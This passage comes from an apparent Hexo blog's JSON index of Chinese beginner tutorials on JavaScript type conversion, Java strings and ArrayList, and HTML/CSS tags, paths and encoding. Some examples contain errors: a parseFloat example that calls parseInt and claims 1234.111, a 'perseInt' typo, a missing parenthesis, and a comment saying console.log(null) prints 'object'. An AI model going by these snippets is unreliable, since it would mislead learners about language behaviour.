5.%取模运算符(取余数) 12var a = 10;a = a % 9;//1","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"转换为Boolean","slug":"JS00014转换为Boolean","date":"2020-02-17T08:58:33.000Z","updated":"2020-03-01T10:09:18.316Z","comments":true,"path":"2020/02/17/JS00014转换为Boolean/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00014转换为Boolean/","excerpt":"","text":"转换为Boolean 将其他类型转换为Boolean 使用Boolean()函数 除了0和NaN,其他的都为true 字符串转布尔,除了空串,其余的都是true. null和undefined都会转换为false 对象也会转换为true 12345678910var a = 123;var b = 0;var c = NaN;var d = \"\";console.log(Boolean(a));//trueconsole.log(Boolean(b);//falseconsole.log(Boolean(c));//falseconsole.log(Boolean(d));//falseconsole.log(Boolean(null));//falseconsole.log(Boolean(undefined));//false","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"其他进制的数字","slug":"JS00013其他进制的数字","date":"2020-02-17T08:33:11.000Z","updated":"2020-02-17T08:57:07.851Z","comments":true,"path":"2020/02/17/JS00013其他进制的数字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00013其他进制的数字/","excerpt":"","text":"其他进制的数字 在JS中,如果需要表示16进制的数字,则需要以0x开头. 12var a = 0x12334;console.log(a); 如果需要表示8进制,则用0开头 12var a = 010;console.log(a); 如果需要表示二进制,用0b开头.但不是所有浏览器都支持. 12var a = 0b010;console.log(a); 有些浏览器会把&quot;070&quot;这种字符串当成10进制 1234var a = \"070\";parseInt(a);//有些浏览器会把这种字符串当成10进制//解决方法parseInt(a,8);","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-Number","slug":"JS00012强制类型转换Number","date":"2020-02-17T07:48:04.000Z","updated":"2020-03-01T10:13:13.981Z","comments":true,"path":"2020/02/17/JS00012强制类型转换Number/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00012强制类型转换Number/","excerpt":"","text":"强制类型转换-Number 将其他数据类型转换为Number 字符串----&gt;数字 转换方式一: 使用Number()函数; Number(变量) 1.如果是纯数字的字符串,则直接将其转换为数字 2.如果是字符串中有非数字的内容,则转换为NaN 3.如果字符串是一个空串或者是一个全空格的字符串,则转换为0 4.布尔类型转Number,true会转换为1,false转换为0 5.null ----&gt; 数字0 6.Undefined —&gt; 数字:NaN 转换方式二: 这种方式专门用来转换字符串 parseInt()把一个字符串转换为一个整数. parseInt()可以将一个字符串中的有效的整数内容取出来. 12var a = \"1234px\";var b = parseInt(a);//1234 parseFloat()把一个字符串转换为一个浮点数. 12var a = \"1234.111px\";var b = parseInt(a);//1234.111 如果对非String使用parseInt()或parseFloat(),他会先将其转换为String,然后在操作 12var a = true;var b = perseInt(true);//返回NaN 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //Number() var a = \"123\"; a = Number(a); console.log(a); //123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);// 0 //parseInt() || parseFloat(); console.log(\"=========================\"); var a = \"123a\"; a = parseInt(a); console.log(a);//123 var a = \"123\"; a = Number(a); console.log(a);//123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);//0 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-String","slug":"JS00011强制类型转换-String","date":"2020-02-17T07:30:25.000Z","updated":"2020-02-17T07:48:42.013Z","comments":true,"path":"2020/02/17/JS00011强制类型转换-String/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00011强制类型转换-String/","excerpt":"","text":"强制类型转换-String 强制转换类型是指将一个数据类型强制转换为其他的数据类型 类型转换主要指,将其他的数据类型,转换为 String Number Boolean 方式一: 调用被转换数据类型的toString()方法 例如 : a.toString() 该方法不会影响到原变量,他会将转换结果返回. 注意: 如果将null和Undefined这两个值用转换toString()方法就会出错 方式二 调用String()函数,并将转换的数据作为参数传递函数 例如:String(123);----String(123); 使用String();函数做强制转换时: 对于Number和Boolean实际上就是调用toString()方法 但是对于null和undefined,就不会调用toString()方法 他会将null直接转换为&quot;null&quot; 将Undefined直接转换为&quot;Undefined&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var str = 123; console.log(str.toString()); //// str = null; 出错// console.log(str.toString());// str = undefined;出错// console.log(str.toString()); str = 123.3; console.log(str.toString()); str = true; console.log(str.toString()); str = 1231; str = String(str); console.log(str); console.log(\"=================\"); str = 123.2; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = undefined; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = true; str = String(str); console.log(str); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"字符串的获取相关方法","slug":"java00056字符串的获取相关方法","date":"2020-02-16T17:44:12.000Z","updated":"2020-02-16T18:01:08.023Z","comments":true,"path":"2020/02/17/java00056字符串的获取相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00056字符串的获取相关方法/","excerpt":"","text":"字符串的获取相关方法 常用方法有: public int lenght(); 获取字符串长度 public String concat(String str);拼接两个字符串 public char charAt(int index);返回指定索引的字符 public int indexOf(String str);查找子字符串出现在本字符串的首字符索引值,如果没有则返回-1 1234567891011121314151617181920public class demo09&#123; public static void main(String[] args) &#123; String str = new String(\"abc\"); String str1; int len = 0; int index = 0; char ch; len = str.length();//获取字符串长度 ch = str.charAt(0);//获取str的第0个索引的字符 str1 = str.concat(\"def\");//拼接两个字符串 index = str.indexOf(\"ab\");//查找子字符串第一次出现的索引值 System.out.println(\"字符串长度:\" + len); System.out.println(\"第0个字符是:\" + ch); System.out.println(\"拼接字符:\" + str1); System.out.println(\"字符串出现的\" + index); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的比较方法","slug":"java00055字符串的比较方法","date":"2020-02-16T17:14:16.000Z","updated":"2020-02-16T17:42:58.762Z","comments":true,"path":"2020/02/17/java00055字符串的比较方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00055字符串的比较方法/","excerpt":"","text":"字符串的比较方法 想让两个字符串进行比较,就用: public boolean equals(Object obj);方法,区分大小写 public boolean equalsIgnoreCase(Object obj);不区分字母大小写 参数可以是任何对象,只有参数是一个字符串并且内容相同的才会返回一个true,否者返回false. 1.任何对象都可以用Object来接收. 2.equals方法具有对称性,也就是a.equals(b)和b.equals(a)是一样的 3.如果比较两个字符串一个是字符串常量,另一个是字符串变量,推荐把字符串常量写在前面. 推荐: &quot;zzz&quot;.equals(str); 不推荐 abc.equals(&quot;zzz&quot;); 因为如果abc是一个null又调用equals()就会抛出异常. 如果是zzz.equals(str)则会返回一个false; 12345678910111213public class demo08&#123; public static void main(String[] args) &#123; String str1 = new String(\"123\"); String str2 = new String(\"123\"); String str3 = new String(\"456\"); System.out.println(str1.equals(str2));//true System.out.println(str1.equals(str3));//false System.out.println(\"ABC\".equalsIgnoreCase(\"abc\"));//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的常量池","slug":"java00054字符串的常量池","date":"2020-02-16T16:51:33.000Z","updated":"2020-02-16T17:24:17.046Z","comments":true,"path":"2020/02/17/java00054字符串的常量池/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00054字符串的常量池/","excerpt":"","text":"字符串的常量池 字符串常量池:程序当中直接写上的双引号字符串,就在字符串常量池中. 对于基本类型来说, == 是用来进行数值比较的. 对于引用类型来说,== 是进行地址值的比较. String引用声明出来的字符串是不能直接修改的,修改的只是是地址值.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的构造和直接创建","slug":"java00053字符串的构造和直接创建","date":"2020-02-15T14:01:21.000Z","updated":"2020-02-15T14:20:47.169Z","comments":true,"path":"2020/02/15/java00053字符串的构造和直接创建/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00053字符串的构造和直接创建/","excerpt":"","text":"字符串的构造和直接创建 创建字符串的常见3+1种方式. 三种构造方法: 1.创建一个空白字符串,不含有任何内容. public String(); 2.根据字符数组的内容,来创建对应的字符串. public String(char[] array); 3.根据字节数组的内容,来创建对应的字符串. public String(byte[] array); 一种直接创建: String str = &quot;abc&quot;; //右边直接用双引号 注意: 直接写上双引号,就是字符串对象了 123456789101112131415161718192021222324public class demo06&#123; public static void main(String[] args) &#123; //直接创建 String str1 = \"qqqqq\"; //创建一个空白字符串 String str2 = new String(); //根据字符数组创建 char[] charv = &#123;'w','w','w','w'&#125;; String str3 = new String(charv); //根据byte数组创建 byte[] bt = &#123;(int)'a',65,67,77,69&#125;; String str4 = new String(bt); System.out.println(str1); System.out.println(str2); System.out.println(str3); System.out.println(str4); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串概述和特点","slug":"java00052字符串概述和特点","date":"2020-02-15T13:53:47.000Z","updated":"2020-02-15T14:00:14.121Z","comments":true,"path":"2020/02/15/java00052字符串概述和特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00052字符串概述和特点/","excerpt":"","text":"字符串概述和特点 字符串概述 java.lang.String类代表字符串 API当中说,Java程序中所有的字符串字面值(如 “abcd”) 都作为此类的实例实现. 其实就是说:程序当中所有的双引号字符串,都是String类的对象.(就算没有 nwe,也照样是.) 字符串的特点 1.字符串的内容永不可变.【重点】 2.因为字符串不可以改变，所以字符串是可以共享使用的。 3.字符串效果上相当于是char[]字符数组，但是底层原理是byte[]字节数组.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数返回类型","slug":"java00051用ArrayList类型做函数返回类型","date":"2020-02-15T13:44:45.000Z","updated":"2020-02-15T13:51:01.494Z","comments":true,"path":"2020/02/15/java00051用ArrayList类型做函数返回类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00051用ArrayList类型做函数返回类型/","excerpt":"","text":"用ArrayList类型做函数返回类型 格式: public static ArrayList&lt;引用类型&gt; 函数名(类型名 变量名 ) 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.Random;/*随机存储20位数到ArrayList中,通过函数调用筛选偶数出来,并存储在一个集合中,然后返回一个只装有偶数的集合.*/public class demo05&#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; smallList; Random r = new Random(); for (int i = 0; i &lt; 20; i++) &#123; intList.add(r.nextInt(1000)); &#125; smallList = isOuShu(intList); System.out.println(\"偶数总个数: \" + smallList.size()); System.out.println(smallList); &#125; //用 ArrayList&lt;Integer&gt;做函数返回类型 public static ArrayList&lt;Integer&gt; isOuShu(ArrayList&lt;Integer&gt; intList) &#123; ArrayList&lt;Integer&gt; smallList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; intList.size(); i++) &#123; int num = intList.get(i); if(num % 2 == 0) &#123; smallList.add(num); &#125; &#125; return smallList; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数参数","slug":"java00050用ArrayList类型做函数参数","date":"2020-02-15T13:29:09.000Z","updated":"2020-02-15T13:46:00.025Z","comments":true,"path":"2020/02/15/java00050用ArrayList类型做函数参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00050用ArrayList类型做函数参数/","excerpt":"","text":"用ArrayList类型做函数参数 格式: public static 返回值类型 函数名(ArrayList&lt;引用类型&gt; 变量名 ) 1234567891011121314151617181920212223242526272829import java.util.ArrayList;public class demo04&#123; public static void main(String[] args) &#123; ArrayList&lt;Student&gt; std = new ArrayList&lt;&gt;(); std.add(new Student(\"张三丰\",99)); std.add(new Student(\"张无忌\",19)); std.add(new Student(\"宋远桥\",39)); std.add(new Student(\"张翠山\",44)); printArrayList(std); &#125; //用ArrayList&lt;Student&gt;做函数参数,传递过来的是一个引用的地址 public static void printArrayList(ArrayList&lt;Student&gt; std)&#123; System.out.print(\"&#123;\"); for (int i = 0; i &lt; std.size(); i++) &#123; if(i == std.size() - 1) &#123; System.out.print(std.get(i).getName() + \"&#125;\"); &#125;else&#123; System.out.print(std.get(i).getName() + \"@\"); &#125; &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829public class Student&#123; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public Student() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合存储基本数据","slug":"java00049ArrayList集合存储基本数据","date":"2020-02-15T13:10:36.000Z","updated":"2020-02-15T13:25:16.632Z","comments":true,"path":"2020/02/15/java00049ArrayList集合存储基本数据/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00049ArrayList集合存储基本数据/","excerpt":"","text":"ArrayList集合存储基本数据 泛型只能是引用类型,不能是基本类型 如果希望向集合ArrayList当中存储基本类型对应的&quot;包装类&quot;。 基本类型 包装类(引用类型,包装类都位于java.lang包下) byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean 从JDK 1.5+开始,支持自动装箱和自动拆箱 自动装箱:基本类型自动转换到包装类型 自动拆箱:包装类型自动转换到基本类型 使用格式: ArrayList&lt;Integer&gt; intVal = new ArrayList&lt;&gt;(); 12345678910111213141516171819import java.util.ArrayList;import java.util.List;import java.util.Scanner;public class demo01&#123; public static void main(String[] args) &#123; //使用包装类 ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); Scanner sc = new Scanner(System.in); //向列表加入元素 intList.add(888); intList.add(89); intList.add(sc.nextInt()); //输出列表 System.out.println(intList); System.out.println(intList.get(1)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"图片的格式","slug":"html-css00010图片的格式","date":"2020-02-15T03:21:22.000Z","updated":"2020-02-15T03:43:08.487Z","comments":true,"path":"2020/02/15/html-css00010图片的格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00010图片的格式/","excerpt":"","text":"图片的格式 常用的图片格式有三种,分别是：JPG、GIF、PNG. JPEG(JPG) JPEG图片支持的颜色比较多,图片可以压缩,但是不支持透明 一般使用JPEG来保存颜色比较丰富的图片. GIF GIF支持的颜色少,只支持简单的透明,支持动态图 图片颜色单一或者是动态图时可以使用gif PNG PNG支持的颜色多,并且支持复杂的透明 可以用来显示颜色复杂的透明的图片 图片的使用原则 效果不一致,使用效果好的. 效果一致,使用内存小的.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"相对路径","slug":"html-css00009相对路径","date":"2020-02-15T03:05:21.000Z","updated":"2020-02-15T03:52:44.737Z","comments":true,"path":"2020/02/15/html-css00009相对路径/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00009相对路径/","excerpt":"","text":"相对路径 src属性配置的是图片的路径,目前我们所要使用的路径全都是相对路径. 相对路径: 相对路径指相对于当前资源所在目录的位置. 当前文件目录的文件直接写文件名 &lt;img src=&quot;1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 可以使用../来返回上一级目录. &lt;img src=&quot;../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回上上级目录. &lt;img src=&quot;../../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回几级目录就用几个../ 当前文件的下一级目录. &lt;img src=&quot;abc/123.jpg&quot; alt=&quot;老师&quot;&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"图片标签","slug":"html-css00008图片标签","date":"2020-02-15T02:28:07.000Z","updated":"2020-02-15T02:45:34.126Z","comments":true,"path":"2020/02/15/html-css00008图片标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00008图片标签/","excerpt":"","text":"图片标签 使用img标签来向网页中引入一个外部图片. img标签也是一个自结束标签 属性 src: 设置一个外部图片的路径 &lt;img src=&quot;图片路径&quot; /&gt; alt: &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; /&gt; 1.可以用来设置在图片不能显示时,对图片的描述 2.搜索引擎可以通过alt属性来识别不同的图片. 3如果不写alt属性,则搜索引擎不会对img中的图片进行收录 width:可以用来修改图片宽度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; width=&quot;100px&quot;/&gt; height:可以用来修改图片的高度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; height=&quot;100px&quot; /&gt; 注意: 1.如果宽度和高度两个属性只设置一个,另一个也会同时等比例调整大小. 2.如果两个值同时指定,则按照你指定的值来设置. 3.一般开发中除了自适应的页面,不建议设置width和height.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"实体","slug":"html-css00007实体","date":"2020-02-15T02:15:49.000Z","updated":"2020-02-15T02:26:21.630Z","comments":true,"path":"2020/02/15/html-css00007实体/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00007实体/","excerpt":"","text":"实体 在HTML中,一些如&lt;&gt;这种特殊字符是不能直接使用的,需要使用一些特殊的符号来表示这些特殊字符,这些特殊符号,我们称为实体(转义字符). 浏览器解析到实体时,会自动将实体转换为对应的字符. 实体语法 &amp;实体名字; &lt; 对应的实体是:&amp;lt; &gt;对应的实体是:&amp;gt; 空格实体: &amp;nbsp; 版权符号:&amp;copy; tab制表符实体: &amp;emsp; 其余的可以去查看一些官方的手册.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"常用的标签","slug":"html-css00006常用的标签","date":"2020-02-14T13:59:23.000Z","updated":"2020-02-15T01:05:16.646Z","comments":true,"path":"2020/02/14/html-css00006常用的标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00006常用的标签/","excerpt":"","text":"常用的标签 标签 HTML中的标记指的就是标签. HTML使用标记标签来描述网页 结构: &lt;标签名&gt; 标签内容 &lt;/标签名&gt; &lt;标签名 /&gt; 元素: 元素和标签都是等价的,说白了元素就是标签… 但我们也可以理解成一个完整的标签称为元素. 如上面的结构所述的就是完整的标签 例如:&lt;h1&gt;我是一个完整的元素&lt;/h1&gt; 属性: 可以为HTML标签设置属性 通过属性为HTML元素提供附加信息 属性需要设置在开始标签或自结束标签中 属性总是以名称/值对的形式出现的 比如:name =&quot;value&quot; &lt;img src=&quot;&quot; alt=&quot;&quot; /&gt; 标题标签 在HTML中一共有6级标题标签 h1~h6,其中h1最大,h6最小 使用html标签时,关心的是标签的语义,我们使用的标签都是语义化标签. 6级标题中,h1的最重要,h1的重要性仅次于title,搜索引擎检索完title之后,会立即查看h1中的内容 h1标签非常重要,他会影响到页面在搜索引擎中的排名,页面只能写一个h1 一般页面中标题标签只使用h1~h3标题标签,h3以后的基本不使用 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;我是1级标签&lt;/h1&gt; &lt;h2&gt;我是2级标签&lt;/h2&gt; &lt;h3&gt;我是3级标签&lt;/h3&gt; &lt;h4&gt;我是4级标签&lt;/h4&gt; &lt;h5&gt;我是5级标签&lt;/h5&gt; &lt;h6&gt;我是6级标签&lt;/h6&gt; &lt;/body&gt;&lt;/html&gt; 段落标签 段落标签,段落标签用于表示内容中的一个自然段 使用p标签来表示一个段落 p标签中的文字,默认会独占一行,并且段与段之间会有一个间距 &lt;p&gt;我是一个段落标签,用来表示一个自然段.&lt;/p&gt; 在HTML中,字符之间写再多的空格,浏览器也会当成一个空格解析,换行也会当成一个空格解析 &lt;br&gt;换行标签 在页面中使用br标签来表示一个换行,br标签是一个自结束标签. &lt;br /&gt; &lt;hr&gt;水平标签 hr也是一个自结束标签,可以在页面中生成一条水平线. &lt;hr /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"乱码问题","slug":"html-css00005乱码问题","date":"2020-02-14T13:08:01.000Z","updated":"2020-02-14T13:26:46.712Z","comments":true,"path":"2020/02/14/html-css00005乱码问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00005乱码问题/","excerpt":"","text":"乱码问题 编码: 依据一定的规则,将字符转换为二进制编码的过程称之为编码. 解码: 依据一定的规则,将二进制编码转换为字符的过程称之为解码. 字符集: 编码和解码所采用的规则,我们称之为字符集 常见字符集: 1.ASCII 2.ISO-8859-1 3.GBK 4.GB2312 中文系统默认编码 5.UTF-8 万国码,支持地球上所有的文字 乱码原因: 产生乱码的根本原因是,编码和解码所采用的字符集不同 在中文系统的浏览器中,默认都是使用GB2312进行解码的 解决: 用&lt;meta charset=&quot;字符集&quot; /&gt;标签告诉浏览器网页所采用的编码字符集 meta标签用来设置网页的一些元数据,比如网页的字符集,关键字,简介等… meta是一个自结束标签,编写一个自结束标签时,可以在开始标签中添加一个 / ANSI ANSI代表智能字符集,会跟随操作系统默认选择的字符集 例如中文操作系统默认的字符集是GB2312 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;!--告诉浏览器,使用UTF-8进行解码 --&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS文档声明","slug":"html-css00004文档声明","date":"2020-02-14T12:17:28.000Z","updated":"2020-02-14T13:07:30.471Z","comments":true,"path":"2020/02/14/html-css00004文档声明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00004文档声明/","excerpt":"","text":"JS文档声明 我们需要告诉浏览器我们编写的html是使用哪个版本的 HTML5版本的文档声明很简单,只需要在顶部添加&lt;!DOCTYPE html&gt;既可. 注意事项 如果不添加文档声明,则会导致有些浏览器会进入一个怪异模式,进入怪异模式以后,浏览器解析页面会导致页面无法正常显示,所以为了避免进入该模式,一定要写文档声明 12345678910&lt;!--我是文档声明--&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Null和Undefined","slug":"JS00010Null和Undefined","date":"2020-02-14T01:22:09.000Z","updated":"2020-02-14T04:39:21.635Z","comments":true,"path":"2020/02/14/JS00010Null和Undefined/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00010Null和Undefined/","excerpt":"","text":"Null和Undefined Null(空值)类型只有一个值,就是null null这个值专门用来表示一个为空的对象 使用typeof检查一个null值时,会返回object Undefined(未定义)类型的值只有一个,就Undefined 当声明一个变量,但未初始化时,他的值就是Undefined 使用typeof检查一个Undefined值时,也会返回一个undefined 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //定义一个空类型变量,和一个Undefined变量 var a = null; var b; console.log(a); // 输出object console.log(b); // 输出undefined //输出object console.log(typeof a); //输出 undefined console.log(typeof b); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[{"name":"Null和Undefined","slug":"Null和Undefined","permalink":"https://xiaowuyoucy.github.io/tags/Null和Undefined/"}]},{"title":"JS_Boolean类型","slug":"JS00009-Boolean值类型","date":"2020-02-14T01:12:57.000Z","updated":"2020-02-14T04:39:14.528Z","comments":true,"path":"2020/02/14/JS00009-Boolean值类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00009-Boolean值类型/","excerpt":"","text":"JS_Boolean类型 Boolean布尔值 布尔值有两个,主要用来做逻辑判断 true 表示真 false 表示假 使用typeof检查一个布尔值时,会返回一个boolean 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; var isBingo = false; console.log(typeof false); console.log(typeof true); console.log(isBingo); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS_Number类型","slug":"JS00008-Number类型","date":"2020-02-14T00:29:49.000Z","updated":"2020-02-14T04:39:08.846Z","comments":true,"path":"2020/02/14/JS00008-Number类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00008-Number类型/","excerpt":"","text":"JS_Number类型 基本概念及使用 在JS中所有的数值都是Number类型,包括整数和浮点数 可以使用一个运算符typeof来检查变量类型,使用格式typeof 变量名会返回一个变量类型的字符串 JS中可以表示的数值的最大值是:Number.MAX_VALUE JS中可以表示大于0的最小值Number.MIN_VALUE 如果使用Number类型的变量超过了Number.MAX_VALUE则会返回一个Infinity,表示正无穷. Infinity表示正无穷 -Infinity表示符无穷 使用typeof检查Infinity也会返回Number NaN是一个特殊的数字,表示Not A Number 用typeof检查NaN时也会返回number 精度: 在JS中整数的基本运算可以保证精确的. 如果使用JS进行浮点运算,可能会得到一个不精确的结果 所以不要使用JS进行对精确度要求比较高的运算 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个整型变量和浮点型变量 var intNumber = 100; var floatNumber = 1.23; //在控制台输出两个变量的值 console.log(intNumber); console.log(floatNumber); //在控制台输出两个变量的类型 console.log(typeof intNumber); console.log(typeof floatNumber); //在控制台输出最大数值和&gt;0的最大数值 console.log(Number.MAX_VALUE); console.log(Number.MIN_VALUE); //超过最大值会返回一个Infinity var a = Number.MAX_VALUE; console.log(a * a); console.log(Number.MIN_VALUE * 1 / 2); //Infinity也是属于Number类型 console.log(typeof Infinity); //会返回一个NaN,表示不是一个数字 console.log(\"basd\" * \"abad\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字符串","slug":"JS00007字符串","date":"2020-02-13T23:57:44.000Z","updated":"2020-02-14T04:39:04.728Z","comments":true,"path":"2020/02/14/JS00007字符串/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00007字符串/","excerpt":"","text":"JS字符串数据 数据类型: 在JS中一共有六种数据类型 String: 字符串类型 Number: 数值类型 Boolean: 布尔类型 Null: 空值 Undefined: 未定义 Object: 对象类型 其中String,Number,Boolean,Null,Undefined属于基本数据类型 而Object属于引用数据类型. String字符串 在JS中字符串需要使用引号引起来,例如&quot;abc&quot; 使用双引号和单引号都可以,但是不能混用,例如&quot; abc ' 这样是错误的. 引号不能嵌套,双引号不能放在双引号中,单引号也不能放在单引号中 在字符串中我们可以使用\\作为转义字符. 输出两个双引号可以用两个单引号引起来:' &quot;abc&quot; ' 当表示一些特殊字符时可以使用\\进行转义,例如: \\n 表示换行符 \\t 表示一个制表符 \\\\ 表示\\ \\’ 表示’ \\&quot; 表示&quot; 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明字符串变量 var str = 